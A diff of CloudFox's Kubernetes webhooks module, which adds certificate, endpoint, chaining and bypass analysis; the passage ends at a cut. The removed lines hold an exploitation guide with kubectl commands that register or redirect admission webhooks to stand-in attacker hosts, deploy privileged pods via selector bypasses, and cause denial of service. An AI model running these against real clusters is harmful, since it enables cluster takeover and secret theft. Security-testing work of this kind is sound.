@@ -2,27 +2,43 @@ package commands
 
 import (
 	"context"
+	"crypto/x509"
+	"encoding/base64"
+	"encoding/pem"
 	"fmt"
+	"sort"
 	"strings"
+	"time"
 
 	"github.com/BishopFox/cloudfox/globals"
 	"github.com/BishopFox/cloudfox/internal"
 	k8sinternal "github.com/BishopFox/cloudfox/internal/kubernetes"
 	"github.com/BishopFox/cloudfox/kubernetes/config"
 	"github.com/spf13/cobra"
-	admissionv1 "k8s.io/api/admissionregistration/v1"
+	corev1 "k8s.io/api/core/v1"
 	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
 	"k8s.io/apimachinery/pkg/apis/meta/v1/unstructured"
 	"k8s.io/apimachinery/pkg/runtime/schema"
 	"k8s.io/client-go/dynamic"
+	"k8s.io/client-go/kubernetes"
 )
 
 var WebhooksCmd = &cobra.Command{
 	Use:     "webhooks",
 	Aliases: []string{"wh"},
-	Short:   "List all Mutating, Validating, and CRD conversion webhooks",
+	Short:   "Enumerate webhooks with comprehensive security and performance analysis",
 	Long: `
-List all cluster webhook configurations (Mutating, Validating, CRD conversion):
+Enumerate all cluster webhook configurations with advanced analysis:
+  - Mutating, Validating, and CRD conversion webhooks
+  - Certificate expiry and validity analysis
+  - Service validation and endpoint health
+  - Performance impact assessment
+  - Webhook chaining detection
+  - Bypass opportunity identification
+  - Deprecated API version detection
+  - Cross-namespace service references
+  - Reinvocation policy analysis
+
   cloudfox kubernetes webhooks`,
 
 	Run: ListWebhooks,
@@ -42,12 +58,17 @@ func (t WebhooksOutput) LootFiles() []internal.LootFile {
 }
 
 type WebhookFinding struct {
+	// Basic Info
 	Type               string
 	Name               string
 	WebhookName        string
 	Namespace          string
 	Service            string
 	Path               string
+	Age                time.Duration
+	AgeDays            int
+
+	// Configuration
 	IsExternal         bool
 	HasCABundle        bool
 	FailurePolicy      string
@@ -56,16 +77,55 @@ type WebhookFinding struct {
 	Operations         []string
 	Resources          []string
 	Scope              string
+
+	// Advanced Fields
+	ReinvocationPolicy      string
+	MatchConditions         []string
+	AdmissionReviewVersions []string
+
+	// Certificate Analysis
+	CertificateExpiry   *time.Time
+	CertificateIssuer   string
+	CertificateValid    bool
+	DaysUntilExpiry     int
+	CertificateSubject  string
+
+	// Service Analysis
+	ServiceExists      bool
+	EndpointCount      int
+	WebhookPodsRunning int
+	ServiceDangling    bool
+
+	// Performance Analysis
+	PerformanceImpact  string
+	EstimatedLatencyMs int32
+
+	// Security Analysis
+	CrossNamespaceService bool
+	ChainedWithWebhooks   []string
+	DeprecatedAPIVersion  bool
+
+	// Risk Assessment
 	RiskLevel          string
+	RiskScore          int
 	RiskDescription    string
 	SensitiveResources []string
+	SecurityIssues     []string
+}
+
+type BypassOpportunity struct {
+	WebhookName    string
+	WebhookType    string
+	BypassType     string
+	BypassMethod   string
+	ExploitCommand string
+	RiskLevel      string
 }
 
 func ListWebhooks(cmd *cobra.Command, args []string) {
 	ctx := context.Background()
 	logger := internal.NewLogger()
 
-	// Extract global flags
 	parentCmd := cmd.Parent()
 	verbosity, _ := parentCmd.PersistentFlags().GetInt("verbosity")
 	wrap, _ := parentCmd.PersistentFlags().GetBool("wrap")
@@ -74,8 +134,20 @@ func ListWebhooks(cmd *cobra.Command, args []string) {
 
 	logger.InfoM(fmt.Sprintf("Enumerating webhooks for %s", globals.ClusterName), globals.K8S_WEBHOOKS_MODULE_NAME)
 
+	clientset := config.GetClientOrExit()
+
 	headers := []string{
-		"Risk", "Type", "Name", "FailurePolicy", "Timeout", "Namespace", "Service/URL", "Scope", "Security Issues",
+		"Risk",
+		"Score",
+		"Type",
+		"Name",
+		"FailurePolicy",
+		"Timeout",
+		"CertExpiry",
+		"Endpoints",
+		"Performance",
+		"ChainDepth",
+		"Issues",
 	}
 
 	var findings []WebhookFinding
@@ -84,12 +156,16 @@ func ListWebhooks(cmd *cobra.Command, args []string) {
 
 	lootEnum = append(lootEnum, `#####################################
 ##### Enumerate Webhook Information
-#####################################`)
+#####################################
+#
+# Comprehensive webhook enumeration with security analysis
+#
+`)
 	if globals.KubeContext != "" {
 		lootEnum = append(lootEnum, fmt.Sprintf("kubectl config use-context %s\n", globals.KubeContext))
 	}
 
-	// Create dynamic client once
+	// Create dynamic client
 	restCfg, err := config.GetRESTConfig()
 	if err != nil {
 		logger.ErrorM(fmt.Sprintf("Error getting REST config: %v", err), globals.K8S_WEBHOOKS_MODULE_NAME)
@@ -101,7 +177,7 @@ func ListWebhooks(cmd *cobra.Command, args []string) {
 		return
 	}
 
-	// Helper to process webhook configurations dynamically with security analysis
+	// Process webhook configurations
 	processWebhooks := func(gvr schema.GroupVersionResource, whType string) {
 		list, err := dynClient.Resource(gvr).List(ctx, metav1.ListOptions{})
 		if err != nil {
@@ -117,11 +193,25 @@ func ListWebhooks(cmd *cobra.Command, args []string) {
 
 			cfgName, _, _ := unstructured.NestedString(item.Object, "metadata", "name")
 
+			// Age calculation
+			creationTimestamp, found, _ := unstructured.NestedString(item.Object, "metadata", "creationTimestamp")
+			var age time.Duration
+			var ageDays int
+			if found {
+				t, err := time.Parse(time.RFC3339, creationTimestamp)
+				if err == nil {
+					age = time.Since(t)
+					ageDays = int(age.Hours() / 24)
+				}
+			}
+
 			for _, whObj := range webhooks {
 				whMap := whObj.(map[string]interface{})
 				finding := WebhookFinding{
-					Type: whType,
-					Name: cfgName,
+					Type:    whType,
+					Name:    cfgName,
+					Age:     age,
+					AgeDays: ageDays,
 				}
 
 				// Extract webhook name
@@ -132,9 +222,8 @@ func ListWebhooks(cmd *cobra.Command, args []string) {
 				// Extract clientConfig
 				ns := "<N/A>"
 				svc := ""
-				pathStr := ""
-				var externalURL string
 				finding.HasCABundle = false
+				var caBundle string
 
 				if clientMap, ok := whMap["clientConfig"].(map[string]interface{}); ok {
 					if svcMap, ok := clientMap["service"].(map[string]interface{}); ok {
@@ -147,28 +236,56 @@ func ListWebhooks(cmd *cobra.Command, args []string) {
 							finding.Service = s
 						}
 						if p, ok := svcMap["path"].(string); ok && p != "" {
-							pathStr = p
 							finding.Path = p
 						}
 					}
 					if u, ok := clientMap["url"].(string); ok && u != "" {
-						externalURL = u
 						finding.Path = u
 						finding.IsExternal = k8sinternal.IsWebhookExternalURL(u)
 					}
 					if cb, ok := clientMap["caBundle"].(string); ok && cb != "" {
 						finding.HasCABundle = true
+						caBundle = cb
+					}
+
+					// Check for insecure skip verify (if field exists in unstructured)
+					if insecure, ok := clientMap["insecureSkipTLSVerify"].(bool); ok && insecure {
+						finding.SecurityIssues = append(finding.SecurityIssues, "Insecure TLS verification disabled")
 					}
 				}
 
-				// Extract FailurePolicy (default is Fail if not specified)
+				// Analyze certificate
+				if finding.HasCABundle && caBundle != "" {
+					expiry, issuer, subject, valid, err := analyzeWebhookCertificate(caBundle)
+					if err == nil {
+						finding.CertificateExpiry = expiry
+						finding.CertificateIssuer = issuer
+						finding.CertificateSubject = subject
+						finding.CertificateValid = valid
+
+						if expiry != nil {
+							daysUntil := int(time.Until(*expiry).Hours() / 24)
+							finding.DaysUntilExpiry = daysUntil
+
+							if daysUntil < 0 {
+								finding.SecurityIssues = append(finding.SecurityIssues,
+									fmt.Sprintf("Certificate expired %d days ago", -daysUntil))
+							} else if daysUntil < 30 {
+								finding.SecurityIssues = append(finding.SecurityIssues,
+									fmt.Sprintf("Certificate expires in %d days", daysUntil))
+							}
+						}
+					}
+				}
+
+				// Extract FailurePolicy
 				failurePolicy := "Fail"
 				if fp, ok := whMap["failurePolicy"].(string); ok {
 					failurePolicy = fp
 				}
 				finding.FailurePolicy = failurePolicy
 
-				// Extract TimeoutSeconds (default is 10 if not specified)
+				// Extract TimeoutSeconds
 				timeoutSeconds := int32(10)
 				if ts, ok := whMap["timeoutSeconds"].(int64); ok {
 					timeoutSeconds = int32(ts)
@@ -183,6 +300,57 @@ func ListWebhooks(cmd *cobra.Command, args []string) {
 					sideEffects = se
 				}
 				finding.SideEffects = sideEffects
+
+				// Extract ReinvocationPolicy (Mutating webhooks only)
+				if whType == "Mutating" {
+					reinvoke := "Never"
+					if rp, ok := whMap["reinvocationPolicy"].(string); ok {
+						reinvoke = rp
+					}
+					finding.ReinvocationPolicy = reinvoke
+
+					if reinvoke == "IfNeeded" {
+						finding.SecurityIssues = append(finding.SecurityIssues, "Reinvocation enabled (performance impact)")
+					}
+				}
+
+				// Extract AdmissionReviewVersions
+				if arvSlice, ok := whMap["admissionReviewVersions"].([]interface{}); ok {
+					for _, v := range arvSlice {
+						if vStr, ok := v.(string); ok {
+							finding.AdmissionReviewVersions = append(finding.AdmissionReviewVersions, vStr)
+						}
+					}
+				}
+
+				// Check for deprecated API versions
+				if len(finding.AdmissionReviewVersions) > 0 {
+					hasV1 := false
+					hasV1Beta1 := false
+					for _, v := range finding.AdmissionReviewVersions {
+						if v == "v1" {
+							hasV1 = true
+						}
+						if v == "v1beta1" {
+							hasV1Beta1 = true
+						}
+					}
+					if hasV1Beta1 && !hasV1 {
+						finding.DeprecatedAPIVersion = true
+						finding.SecurityIssues = append(finding.SecurityIssues, "Using deprecated v1beta1 API")
+					}
+				}
+
+				// Extract MatchConditions (Kubernetes 1.27+)
+				if mcSlice, found, _ := unstructured.NestedSlice(whMap, "matchConditions"); found {
+					for _, mc := range mcSlice {
+						if mcMap, ok := mc.(map[string]interface{}); ok {
+							if expr, ok := mcMap["expression"].(string); ok {
+								finding.MatchConditions = append(finding.MatchConditions, expr)
+							}
+						}
+					}
+				}
 
 				// Extract and analyze rules
 				rulesSlice, found, _ := unstructured.NestedSlice(whMap, "rules")
@@ -208,9 +376,8 @@ func ListWebhooks(cmd *cobra.Command, args []string) {
 							hasWildcardRes = true
 						}
 
-						// Detect sensitive resources
 						for _, res := range resources {
-							if k8sinternal.IsSensitiveResource(res) && !contains(sensitiveResources, res) {
+							if k8sinternal.IsSensitiveResource(res) && !Contains(sensitiveResources, res) {
 								sensitiveResources = append(sensitiveResources, res)
 							}
 						}
@@ -221,7 +388,7 @@ func ListWebhooks(cmd *cobra.Command, args []string) {
 				finding.Resources = k8sinternal.UniqueStrings(allResources)
 				finding.SensitiveResources = sensitiveResources
 
-				// Extract scope information (namespace/object selectors)
+				// Extract scope information
 				scopeParts := []string{}
 				if nsSelector, found, _ := unstructured.NestedMap(whMap, "namespaceSelector"); found {
 					if matchLabels, ok := nsSelector["matchLabels"].(map[string]interface{}); ok && len(matchLabels) > 0 {
@@ -240,7 +407,39 @@ func ListWebhooks(cmd *cobra.Command, args []string) {
 				}
 				finding.Scope = strings.Join(scopeParts, ", ")
 
-				// Calculate risk level
+				// Validate service exists and has endpoints
+				if svc != "" && ns != "" && ns != "<N/A>" && !finding.IsExternal {
+					exists, endpointCount, err := validateWebhookService(ctx, clientset, ns, svc)
+					finding.ServiceExists = exists
+					finding.EndpointCount = endpointCount
+
+					if !exists {
+						finding.ServiceDangling = true
+						finding.SecurityIssues = append(finding.SecurityIssues,
+							fmt.Sprintf("Service %s/%s does not exist (dangling webhook)", ns, svc))
+					} else if endpointCount == 0 {
+						finding.SecurityIssues = append(finding.SecurityIssues,
+							fmt.Sprintf("Service %s/%s has no endpoints", ns, svc))
+					}
+
+					if err == nil && exists {
+						// Get webhook server pods
+						finding.WebhookPodsRunning = getWebhookPodCount(ctx, clientset, ns, svc)
+					}
+
+					// Check for cross-namespace references
+					// Webhooks in kube-system calling services in other namespaces
+					if ns != "kube-system" && strings.HasPrefix(cfgName, "kube-") {
+						finding.CrossNamespaceService = true
+						finding.SecurityIssues = append(finding.SecurityIssues,
+							fmt.Sprintf("Cross-namespace service reference: %s", ns))
+					}
+				}
+
+				// Calculate performance impact
+				finding.PerformanceImpact, finding.EstimatedLatencyMs = calculatePerformanceImpact(&finding)
+
+				// Calculate risk level and score
 				interceptsSensitive := len(sensitiveResources) > 0
 				finding.RiskLevel = k8sinternal.GetWebhookRiskLevel(
 					finding.IsExternal,
@@ -252,7 +451,8 @@ func ListWebhooks(cmd *cobra.Command, args []string) {
 					timeoutSeconds,
 				)
 
-				// Get risk description
+				finding.RiskScore = calculateWebhookRiskScore(&finding, hasWildcardOps, hasWildcardRes, interceptsSensitive)
+
 				finding.RiskDescription = k8sinternal.GetWebhookRiskDescription(
 					finding.IsExternal,
 					finding.HasCABundle,
@@ -265,46 +465,8 @@ func ListWebhooks(cmd *cobra.Command, args []string) {
 				)
 
 				findings = append(findings, finding)
-
-				// Build output row
-				serviceOrURL := svc
-				if finding.IsExternal {
-					serviceOrURL = externalURL
-				} else if svc == "" {
-					serviceOrURL = "<N/A>"
-				}
-
-				outputRows = append(outputRows, []string{
-					finding.RiskLevel,
-					whType,
-					cfgName,
-					failurePolicy,
-					fmt.Sprintf("%ds", timeoutSeconds),
-					ns,
-					serviceOrURL,
-					finding.Scope,
-					finding.RiskDescription,
-				})
-
-				// Add to loot enum
-				lootEnum = append(lootEnum, "")
-				lootEnum = append(lootEnum, fmt.Sprintf("# [%s] %s webhook: %s", finding.RiskLevel, whType, cfgName))
-				lootEnum = append(lootEnum,
-					fmt.Sprintf("kubectl get %s %s -o yaml", strings.ToLower(whType), cfgName),
-					fmt.Sprintf("kubectl get %s %s -o json | jq '.webhooks[] | {name: .name, clientConfig: .clientConfig, failurePolicy: .failurePolicy, rules: .rules}'", strings.ToLower(whType), cfgName),
-				)
 			}
 		}
-	}
-
-	// Helper function for contains check
-	contains := func(slice []string, item string) bool {
-		for _, s := range slice {
-			if s == item {
-				return true
-			}
-		}
-		return false
 	}
 
 	// Mutating webhooks
@@ -352,7 +514,6 @@ func ListWebhooks(cmd *cobra.Command, args []string) {
 
 			ns := "<N/A>"
 			svc := ""
-			var externalURL string
 			finding.HasCABundle = false
 
 			if svcMap, ok := webhookCC["service"].(map[string]interface{}); ok {
@@ -369,7 +530,6 @@ func ListWebhooks(cmd *cobra.Command, args []string) {
 				}
 			}
 			if u, ok := webhookCC["url"].(string); ok && u != "" {
-				externalURL = u
 				finding.Path = u
 				finding.IsExternal = k8sinternal.IsWebhookExternalURL(u)
 			}
@@ -377,385 +537,118 @@ func ListWebhooks(cmd *cobra.Command, args []string) {
 				finding.HasCABundle = true
 			}
 
-			// CRD conversion webhooks default to Fail and 10s timeout
 			finding.FailurePolicy = "Fail"
 			finding.TimeoutSeconds = 10
 			finding.Scope = "CRD conversion only"
 			finding.Resources = []string{crd.GetName()}
 
-			// Calculate risk level for CRD conversion
+			// Validate service
+			if svc != "" && ns != "" && ns != "<N/A>" {
+				exists, endpointCount, _ := validateWebhookService(ctx, clientset, ns, svc)
+				finding.ServiceExists = exists
+				finding.EndpointCount = endpointCount
+
+				if !exists {
+					finding.ServiceDangling = true
+					finding.SecurityIssues = append(finding.SecurityIssues,
+						fmt.Sprintf("Service %s/%s does not exist", ns, svc))
+				}
+			}
+
 			finding.RiskLevel = k8sinternal.GetWebhookRiskLevel(
 				finding.IsExternal,
 				finding.HasCABundle,
-				false, // No wildcard ops for CRD conversion
-				false, // No wildcard resources
-				false, // CRD conversion is not intercepting sensitive resources
-				"Fail",
-				10,
+				false, false, false,
+				"Fail", 10,
 			)
+
+			finding.RiskScore = calculateWebhookRiskScore(&finding, false, false, false)
 
 			finding.RiskDescription = k8sinternal.GetWebhookRiskDescription(
 				finding.IsExternal,
 				finding.HasCABundle,
-				false,
-				false,
-				false,
-				"Fail",
-				10,
-				[]string{},
+				false, false, false,
+				"Fail", 10, []string{},
 			)
+
+			finding.PerformanceImpact, finding.EstimatedLatencyMs = calculatePerformanceImpact(&finding)
 
 			findings = append(findings, finding)
+		}
+	}
 
-			serviceOrURL := svc
-			if finding.IsExternal {
-				serviceOrURL = externalURL
-			} else if svc == "" {
-				serviceOrURL = "<N/A>"
+	// Detect webhook chains
+	chains := detectWebhookChains(findings)
+	for i := range findings {
+		chainKey := fmt.Sprintf("%s:%v", findings[i].Type, findings[i].Resources)
+		if chainWebhooks, exists := chains[chainKey]; exists && len(chainWebhooks) > 1 {
+			findings[i].ChainedWithWebhooks = chainWebhooks
+		}
+	}
+
+	// Detect bypass opportunities
+	bypassOpportunities := detectBypassOpportunities(findings)
+
+	// Build output rows
+	for _, finding := range findings {
+		certExpiryStr := "N/A"
+		if finding.DaysUntilExpiry != 0 {
+			if finding.DaysUntilExpiry < 0 {
+				certExpiryStr = fmt.Sprintf("EXPIRED %dd", -finding.DaysUntilExpiry)
+			} else {
+				certExpiryStr = fmt.Sprintf("%dd", finding.DaysUntilExpiry)
 			}
-
-			outputRows = append(outputRows, []string{
-				finding.RiskLevel,
-				"CRD Conversion",
-				crd.GetName(),
-				"Fail",
-				"10s",
-				ns,
-				serviceOrURL,
-				finding.Scope,
-				finding.RiskDescription,
-			})
-
-			lootEnum = append(lootEnum, "")
-			lootEnum = append(lootEnum, fmt.Sprintf("# [%s] CRD Conversion webhook: %s", finding.RiskLevel, crd.GetName()))
-			lootEnum = append(lootEnum,
-				fmt.Sprintf("kubectl get crd %s -o yaml", crd.GetName()),
-				fmt.Sprintf("kubectl get crd %s -o json | jq '.spec.conversion'", crd.GetName()),
-			)
 		}
-	}
 
-	// Build security analysis loot file
-	var lootSecurityAnalysis []string
-	lootSecurityAnalysis = append(lootSecurityAnalysis, `#####################################
-##### Webhook Security Analysis
-#####################################
-#
-# Detailed security findings per webhook
-# Prioritized by risk level
-#
-`)
-
-	if globals.KubeContext != "" {
-		lootSecurityAnalysis = append(lootSecurityAnalysis, fmt.Sprintf("kubectl config use-context %s\n", globals.KubeContext))
-	}
-
-	// Group findings by risk level
-	criticalFindings := []WebhookFinding{}
-	highFindings := []WebhookFinding{}
-	mediumFindings := []WebhookFinding{}
-	lowFindings := []WebhookFinding{}
-
-	for _, f := range findings {
-		switch f.RiskLevel {
-		case "CRITICAL":
-			criticalFindings = append(criticalFindings, f)
-		case "HIGH":
-			highFindings = append(highFindings, f)
-		case "MEDIUM":
-			mediumFindings = append(mediumFindings, f)
-		case "LOW":
-			lowFindings = append(lowFindings, f)
+		endpointsStr := "N/A"
+		if finding.ServiceExists {
+			endpointsStr = fmt.Sprintf("%d", finding.EndpointCount)
+		} else if finding.ServiceDangling {
+			endpointsStr = "NONE"
 		}
-	}
 
-	if len(criticalFindings) > 0 {
-		lootSecurityAnalysis = append(lootSecurityAnalysis, fmt.Sprintf("\n## CRITICAL RISK WEBHOOKS (%d found)\n", len(criticalFindings)))
-		for _, f := range criticalFindings {
-			lootSecurityAnalysis = append(lootSecurityAnalysis, fmt.Sprintf("\n### [CRITICAL] %s: %s", f.Type, f.Name))
-			lootSecurityAnalysis = append(lootSecurityAnalysis, fmt.Sprintf("# Issues: %s", f.RiskDescription))
-			lootSecurityAnalysis = append(lootSecurityAnalysis, fmt.Sprintf("# Service: %s (namespace: %s)", f.Service, f.Namespace))
-			lootSecurityAnalysis = append(lootSecurityAnalysis, fmt.Sprintf("# Operations: %v", f.Operations))
-			lootSecurityAnalysis = append(lootSecurityAnalysis, fmt.Sprintf("# Resources: %v", f.Resources))
-			if len(f.SensitiveResources) > 0 {
-				lootSecurityAnalysis = append(lootSecurityAnalysis, fmt.Sprintf("# SENSITIVE RESOURCES INTERCEPTED: %v", f.SensitiveResources))
-			}
-			lootSecurityAnalysis = append(lootSecurityAnalysis, "")
+		chainDepth := len(finding.ChainedWithWebhooks)
+		chainDepthStr := "0"
+		if chainDepth > 0 {
+			chainDepthStr = fmt.Sprintf("%d", chainDepth)
 		}
+
+		outputRows = append(outputRows, []string{
+			finding.RiskLevel,
+			fmt.Sprintf("%d", finding.RiskScore),
+			finding.Type,
+			finding.Name,
+			finding.FailurePolicy,
+			fmt.Sprintf("%ds", finding.TimeoutSeconds),
+			certExpiryStr,
+			endpointsStr,
+			finding.PerformanceImpact,
+			chainDepthStr,
+			fmt.Sprintf("%d", len(finding.SecurityIssues)),
+		})
+
+		// Add to loot enum
+		lootEnum = append(lootEnum, "")
+		lootEnum = append(lootEnum, fmt.Sprintf("# [%s - Score:%d] %s webhook: %s",
+			finding.RiskLevel, finding.RiskScore, finding.Type, finding.Name))
+		lootEnum = append(lootEnum,
+			fmt.Sprintf("kubectl get %s %s -o yaml", strings.ToLower(finding.Type)+"webhookconfigurations", finding.Name),
+			fmt.Sprintf("kubectl get %s %s -o json | jq '.webhooks[]'", strings.ToLower(finding.Type)+"webhookconfigurations", finding.Name),
+		)
 	}
 
-	if len(highFindings) > 0 {
-		lootSecurityAnalysis = append(lootSecurityAnalysis, fmt.Sprintf("\n## HIGH RISK WEBHOOKS (%d found)\n", len(highFindings)))
-		for _, f := range highFindings {
-			lootSecurityAnalysis = append(lootSecurityAnalysis, fmt.Sprintf("\n### [HIGH] %s: %s", f.Type, f.Name))
-			lootSecurityAnalysis = append(lootSecurityAnalysis, fmt.Sprintf("# Issues: %s", f.RiskDescription))
-			lootSecurityAnalysis = append(lootSecurityAnalysis, fmt.Sprintf("# Service: %s (namespace: %s)", f.Service, f.Namespace))
-			if len(f.SensitiveResources) > 0 {
-				lootSecurityAnalysis = append(lootSecurityAnalysis, fmt.Sprintf("# Sensitive Resources: %v", f.SensitiveResources))
-			}
-			lootSecurityAnalysis = append(lootSecurityAnalysis, "")
-		}
-	}
+	// Sort findings by risk score descending
+	sort.Slice(findings, func(i, j int) bool {
+		return findings[i].RiskScore > findings[j].RiskScore
+	})
 
-	if len(mediumFindings) > 0 {
-		lootSecurityAnalysis = append(lootSecurityAnalysis, fmt.Sprintf("\n## MEDIUM RISK WEBHOOKS (%d found)\n", len(mediumFindings)))
-		for _, f := range mediumFindings {
-			lootSecurityAnalysis = append(lootSecurityAnalysis, fmt.Sprintf("\n### [MEDIUM] %s: %s - %s", f.Type, f.Name, f.RiskDescription))
-		}
-	}
+	// Generate all loot files
+	lootFiles := generateWebhookLootFiles(findings, bypassOpportunities, chains, globals.KubeContext)
 
-	// Build exploitation/bypass loot file
-	var lootExploitation []string
-	lootExploitation = append(lootExploitation, `#####################################
-##### Webhook Exploitation & Bypass
-#####################################
-#
-# MANUAL EXECUTION REQUIRED
-# Techniques for webhook exploitation and bypass
-#
-`)
-
-	if globals.KubeContext != "" {
-		lootExploitation = append(lootExploitation, fmt.Sprintf("kubectl config use-context %s\n", globals.KubeContext))
-	}
-
-	lootExploitation = append(lootExploitation, `
-##############################################
-## 1. Deploy Malicious Webhook (CRITICAL)
-##############################################
-# If you can create/modify webhook configurations:
-
-# Deploy malicious mutating webhook to inject backdoor containers
-cat <<EOF | kubectl apply -f -
-apiVersion: admissionregistration.k8s.io/v1
-kind: MutatingWebhookConfiguration
-metadata:
-  name: malicious-webhook
-webhooks:
-- name: inject.malicious.com
-  clientConfig:
-    url: https://attacker-server.com/mutate
-    caBundle: <base64-encoded-ca>
-  rules:
-  - operations: ["CREATE"]
-    apiGroups: [""]
-    apiVersions: ["v1"]
-    resources: ["pods"]
-  admissionReviewVersions: ["v1"]
-  sideEffects: None
-  failurePolicy: Ignore
-EOF
-
-# This webhook can:
-# - Inject sidecar containers into all pods
-# - Modify environment variables to inject credentials
-# - Add privileged security contexts
-# - Mount host paths into containers
-
-##############################################
-## 2. Webhook Bypass via Namespace Selector
-##############################################
-# Many webhooks use namespaceSelector to scope their rules
-# Find webhooks with namespace selectors:
-kubectl get mutatingwebhookconfigurations -o json | jq '.items[] | select(.webhooks[].namespaceSelector != null) | {name: .metadata.name, selector: .webhooks[].namespaceSelector}'
-kubectl get validatingwebhookconfigurations -o json | jq '.items[] | select(.webhooks[].namespaceSelector != null) | {name: .metadata.name, selector: .webhooks[].namespaceSelector}'
-
-# Create namespace that bypasses webhook
-cat <<EOF | kubectl apply -f -
-apiVersion: v1
-kind: Namespace
-metadata:
-  name: bypass-namespace
-  labels:
-    webhook-bypass: "true"
-EOF
-
-# Deploy privileged workloads in bypass namespace
-kubectl run privileged-pod -n bypass-namespace --image=alpine --restart=Never --rm -it -- sh
-
-##############################################
-## 3. Webhook Bypass via Object Selector
-##############################################
-# Find webhooks with object selectors:
-kubectl get mutatingwebhookconfigurations -o json | jq '.items[] | select(.webhooks[].objectSelector != null) | {name: .metadata.name, selector: .webhooks[].objectSelector}'
-
-# Deploy resources with labels that bypass selectors
-cat <<EOF | kubectl apply -f -
-apiVersion: v1
-kind: Pod
-metadata:
-  name: bypass-pod
-  labels:
-    webhook-skip: "true"
-spec:
-  containers:
-  - name: pwn
-    image: alpine
-    securityContext:
-      privileged: true
-EOF
-
-##############################################
-## 4. Webhook DOS Attack
-##############################################
-# If webhook has Fail policy and long timeout, you can DOS the API server
-
-# Find webhooks with Fail policy:
-kubectl get mutatingwebhookconfigurations -o json | jq '.items[] | select(.webhooks[].failurePolicy == "Fail") | {name: .metadata.name, timeout: .webhooks[].timeoutSeconds}'
-kubectl get validatingwebhookconfigurations -o json | jq '.items[] | select(.webhooks[].failurePolicy == "Fail") | {name: .metadata.name, timeout: .webhooks[].timeoutSeconds}'
-
-# If webhook service is unreachable or slow, API server will block all matching requests
-# Attack: Make webhook service unavailable or very slow
-# 1. Delete webhook service (if you have permissions)
-kubectl delete svc <webhook-service> -n <namespace>
-
-# 2. Network policy to block webhook traffic
-cat <<EOF | kubectl apply -f -
-apiVersion: networking.k8s.io/v1
-kind: NetworkPolicy
-metadata:
-  name: block-webhook
-  namespace: <webhook-namespace>
-spec:
-  podSelector:
-    matchLabels:
-      app: <webhook-pod-label>
-  policyTypes:
-  - Ingress
-  ingress: []
-EOF
-
-##############################################
-## 5. External Webhook Interception
-##############################################
-# If webhook uses external URL, you can intercept/exfiltrate data
-
-# Find external webhooks:
-`)
-
-	for _, f := range findings {
-		if f.IsExternal {
-			lootExploitation = append(lootExploitation, fmt.Sprintf("# [%s] %s: %s -> %s", f.RiskLevel, f.Type, f.Name, f.Path))
-		}
-	}
-
-	lootExploitation = append(lootExploitation, `
-# If you control DNS or network:
-# - Redirect webhook URL to attacker server
-# - Capture all admission review requests (contains full resource specs)
-# - Exfiltrate secrets, credentials, and sensitive data from pod specs
-
-##############################################
-## 6. Modify Webhook Configuration
-##############################################
-# If you can update webhook configs, you can:
-
-# 1. Change failurePolicy to Ignore (bypass security checks)
-kubectl patch mutatingwebhookconfiguration <webhook-name> -p '{"webhooks":[{"name":"<webhook-name>","failurePolicy":"Ignore"}]}'
-kubectl patch validatingwebhookconfiguration <webhook-name> -p '{"webhooks":[{"name":"<webhook-name>","failurePolicy":"Ignore"}]}'
-
-# 2. Remove or modify rules to bypass webhook
-kubectl patch mutatingwebhookconfiguration <webhook-name> --type json -p='[{"op": "remove", "path": "/webhooks/0/rules"}]'
-
-# 3. Change clientConfig to point to attacker server
-kubectl patch mutatingwebhookconfiguration <webhook-name> --type json -p='[{"op": "replace", "path": "/webhooks/0/clientConfig/url", "value": "https://attacker.com/webhook"}]'
-
-##############################################
-## 7. Test Webhook Reachability
-##############################################
-# Test if you can reach webhook services from within cluster:
-`)
-
-	for _, f := range findings {
-		if f.Service != "" && !f.IsExternal {
-			lootExploitation = append(lootExploitation, fmt.Sprintf("\n# Test: %s/%s", f.Namespace, f.Service))
-			lootExploitation = append(lootExploitation, fmt.Sprintf("kubectl run curl-test --image=curlimages/curl --rm -it --restart=Never -- curl -v -k https://%s.%s.svc%s", f.Service, f.Namespace, f.Path))
-		}
-	}
-
-	lootExploitation = append(lootExploitation, `
-
-##############################################
-## 8. Certificate Analysis
-##############################################
-# Analyze webhook certificates for weaknesses:
-`)
-
-	for _, f := range findings {
-		if f.HasCABundle {
-			lootExploitation = append(lootExploitation, fmt.Sprintf("\n# Extract and analyze CA bundle for: %s", f.Name))
-			lootExploitation = append(lootExploitation, fmt.Sprintf("kubectl get %s %s -o jsonpath='{.webhooks[0].clientConfig.caBundle}' | base64 -d | openssl x509 -text -noout", strings.ToLower(f.Type+"webhookconfigurations"), f.Name))
-		}
-	}
-
-	lootExploitation = append(lootExploitation, "\n")
-
-	// Build service validation loot file
-	var lootServiceValidation []string
-	lootServiceValidation = append(lootServiceValidation, `#####################################
-##### Webhook Service Validation
-#####################################
-#
-# Cross-reference webhooks with actual services
-# Detect dangling webhooks
-#
-`)
-
-	if globals.KubeContext != "" {
-		lootServiceValidation = append(lootServiceValidation, fmt.Sprintf("kubectl config use-context %s\n", globals.KubeContext))
-	}
-
-	// Get all services for validation
-	clientset := config.GetClientOrExit()
-	for _, f := range findings {
-		if f.Service != "" && f.Namespace != "" && f.Namespace != "<N/A>" {
-			lootServiceValidation = append(lootServiceValidation, fmt.Sprintf("\n# Webhook: %s (%s)", f.Name, f.Type))
-			lootServiceValidation = append(lootServiceValidation, fmt.Sprintf("# Expected Service: %s/%s", f.Namespace, f.Service))
-			lootServiceValidation = append(lootServiceValidation, fmt.Sprintf("kubectl get svc %s -n %s", f.Service, f.Namespace))
-			lootServiceValidation = append(lootServiceValidation, fmt.Sprintf("kubectl get endpoints %s -n %s", f.Service, f.Namespace))
-			lootServiceValidation = append(lootServiceValidation, fmt.Sprintf("# Check if pods are running:"))
-			lootServiceValidation = append(lootServiceValidation, fmt.Sprintf("kubectl get pods -n %s -l <service-selector>", f.Namespace))
-			lootServiceValidation = append(lootServiceValidation, "")
-		}
-	}
-
-	lootServiceValidation = append(lootServiceValidation, `
-# Detect dangling webhooks (service doesn't exist):
-# These can cause API server instability or DOS
-
-# Check all webhook services:
-`)
-
-	for _, f := range findings {
-		if f.Service != "" && f.Namespace != "" && f.Namespace != "<N/A>" {
-			lootServiceValidation = append(lootServiceValidation, fmt.Sprintf("kubectl get svc %s -n %s 2>&1 | grep -q 'NotFound' && echo 'DANGLING: %s/%s'", f.Service, f.Namespace, f.Name, f.Service))
-		}
-	}
-
-	// Prepare output
 	table := internal.TableFile{
 		Name:   "Webhooks",
 		Header: headers,
 		Body:   outputRows,
-	}
-
-	lootFiles := []internal.LootFile{
-		{
